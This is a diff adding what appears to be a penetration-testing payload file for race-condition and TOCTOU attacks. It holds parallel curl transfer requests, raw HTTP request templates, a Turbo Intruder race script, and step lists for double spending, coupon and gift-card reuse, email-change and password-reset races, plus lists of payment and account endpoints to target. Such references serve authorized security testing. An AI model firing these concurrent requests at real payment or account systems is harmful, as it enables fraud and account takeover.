@@ -1,0 +1,238 @@
+# Race Condition / TOCTOU Payloads - Comprehensive Collection
+# Version: 1.0.18-20260301-Senin-1812-WIB
+# Category: Race Condition / Time-of-Check-Time-of-Use
+
+# ============================================
+# RACE CONDITION - BASIC
+# ============================================
+
+# Concurrent requests to test TOCTOU
+# Send multiple simultaneous requests
+
+# Example: Gift card redemption
+# Request 1: /redeem?code=GIFT100
+# Request 2: /redeem?code=GIFT100
+# (sent simultaneously)
+
+# ============================================
+# HTTP METHODS FOR RACE CONDITION
+# ============================================
+
+# Parallel requests using Intruder
+# Add multiple threads in Intruder
+
+# Curl race condition
+curl -X POST http://target.com/api/transfer \
+  -d "amount=100" \
+  -H "Cookie: session=abc" &
+curl -X POST http://target.com/api/transfer \
+  -d "amount=100" \
+  -H "Cookie: session=abc" &
+
+# ============================================
+# RACE CONDITION IN FINANCE
+# ============================================
+
+# Double spending
+# 1. Create wallet with $100
+# 2. Send 2 concurrent requests to transfer $100
+# 3. Both might succeed if not properly locked
+
+# Coupon reuse
+POST /apply-coupon?code=SAVE20
+(parallel requests)
+
+# Gift card balance
+POST /redeem?code=GC123
+(parallel requests)
+
+# ============================================
+# TOCTOU IN AUTH
+# ============================================
+
+# Login race
+# 1. Request password reset
+# 2. Quickly change password before token expires
+# 3. Use both old and new password
+
+# Session race
+# 1. Start login
+# 2. During auth, send logout
+# 3. Race condition in session handling
+
+# ============================================
+# FILE UPLOAD RACE
+# ============================================
+
+# Extension check bypass
+# 1. Upload file with allowed extension
+# 2. Quickly modify file content to malicious
+
+# Race between check and move
+# 1. Upload file
+# 2. Modify file before move completes
+
+# ============================================
+# DATABASE RACE
+# ============================================
+
+# Inventory management
+# 1. Check stock (item available)
+# 2. Submit order immediately
+# 3. Race: multiple orders might exceed stock
+
+# Account balance
+# 1. Check balance ($100)
+# 2. Make multiple concurrent withdrawals
+# 3. Race: total withdrawal > balance
+
+# ============================================
+# CACHE POISONING RACE
+# ============================================
+
+# 1. Request page (uncached)
+# 2. During response, poison cache
+# 3. Second user gets poisoned content
+
+# ============================================
+# CWE-367: TOCTOU
+# ============================================
+
+# Time-of-check to time-of-use vulnerabilities
+# Example: File access
+# 1. Check if file exists
+# 2. Use file
+# (Between check and use, file can change)
+
+# ============================================
+# RACE CONDITION PAYLOAD LIST
+# ============================================
+
+# Multi-threaded request patterns
+# Use Intruder with 50+ threads
+
+# Request pattern 1
+POST /api/endpoint HTTP/1.1
+Host: target.com
+Content-Type: application/json
+
+{"action":"do_something"}
+
+# Request pattern 2 - identical
+POST /api/endpoint HTTP/1.1
+Host: target.com
+Content-Type: application/json
+
+{"action":"do_something"}
+
+# ============================================
+# BURP REPEATER RACE
+# ============================================
+
+# Use multiple Repeater tabs
+# Send requests simultaneously
+# Monitor for race conditions
+
+# ============================================
+# TURBO INTRUDER
+# ============================================
+
+# Use Turbo Intruder extension
+# Example script for race condition
+
+def queueRequests(target, wordlists):
+    engine = RequestEngine(target)
+    
+    # Race condition
+    for i in range(20):
+        engine.queue(target.req, gate='race1')
+    
+    engine.openGate('race1')
+
+def handleResponse(req, interesting):
+    if 'success' in req.response:
+        interesting.add(req)
+
+# ============================================
+# RACE CONDITION WORDLIST
+# ============================================
+
+# Use with Intruder
+# Number prefixes for parallel requests
+1_user_transaction
+2_user_transaction
+3_user_transaction
+4_user_transaction
+5_user_transaction
+
+# ============================================
+# RACE DETECTION TOOLS
+# ============================================
+
+# Burp Sequencer
+# Analyze timing differences
+
+# Manual testing
+# Send concurrent requests
+
+# Automated tools
+# - Turbo Intruder
+# - Race the Web
+# - Parallel Curl
+
+# ============================================
+# COMMON VULNERABLE ENDPOINTS
+# ============================================
+
+# Payment processing
+/api/payment/process
+/api/transfer
+/api/refund
+
+# Account management
+/api/password/change
+/api/email/update
+/api/phone/update
+
+# Resource management
+/api/coupon/apply
+/api/coupon/redeem
+/api/giftcard/redeem
+/api/points/redeem
+
+# Inventory
+/api/order/create
+/api/cart/checkout
+/api/reserve
+
+# ============================================
+# RACE CONDITION TEMPLATES
+# ============================================
+
+# Email change race
+# 1. Request email change to attacker@attacker.com
+# 2. Immediately request email change to victim@target.com
+# 3. If vulnerable, confirmation might be sent to wrong email
+
+# Password reset race
+# 1. Request password reset for victim
+# 2. Quickly change reset token
+# 3. Use both tokens
+
+# ============================================
+# HTTP/2 MULTIPLEXING
+# ============================================
+
+# Use HTTP/2 for faster race conditions
+# Send multiple requests on single connection
+
+# ============================================
+# RACE CONDITION CHECKLIST
+# ============================================
+
+# 1. Identify state-changing endpoints
+# 2. Test with parallel requests
+# 3. Check for proper locking
+# 4. Verify transaction atomicity
+# 5. Test timing dependencies
+
